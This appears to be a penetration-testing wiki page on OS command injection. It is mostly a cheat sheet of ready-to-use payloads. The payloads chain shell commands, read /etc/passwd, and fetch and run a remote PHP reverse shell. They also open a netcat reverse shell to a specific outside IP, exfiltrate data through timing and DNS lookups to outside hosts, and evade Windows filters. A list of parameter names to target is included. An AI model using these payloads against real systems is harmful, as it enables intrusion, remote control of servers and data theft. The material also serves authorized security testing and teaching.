# Command Injection

## What is command Injection?

OS command injection \(also known as shell injection\) is a web security vulnerability that allows an attacker to execute arbitrary operating system \(OS\) commands on the server that is running an application, and typically fully compromise the application and all its data. \(From [here](https://portswigger.net/web-security/os-command-injection)\).

### Context

Depending on **where your input is being injected** you may need to **terminate the quoted context** \(using `"` or `'`\) before the commands.

## Command Injection/Execution

```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands

#Not execute but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

### Bypasses

If you are trying to execute **arbitrary commands inside a linux machine** you will be interesting in read about this [**WAF bypasses**](../linux-unix/useful-linux-commands/bypass-bash-restrictions.md).

### **Examples:**

```text
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```

### Parameters

Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities \(from  [link](https://twitter.com/trbughunters/status/1283133356922884096)\):

```text
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

### Time based data exfiltration

Extracting data : char by char

```text
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

### DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```text
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```text
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

* dnsbin.zhack.ca
* pingb.in

### Filtering bypass

#### Windows

```text
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

#### Linux

{% page-ref page="../linux-unix/useful-linux-commands/bypass-bash-restrictions.md" %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/command\_injection.txt" %}

## References

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" %}

{% embed url="https://portswigger.net/web-security/os-command-injection" %}

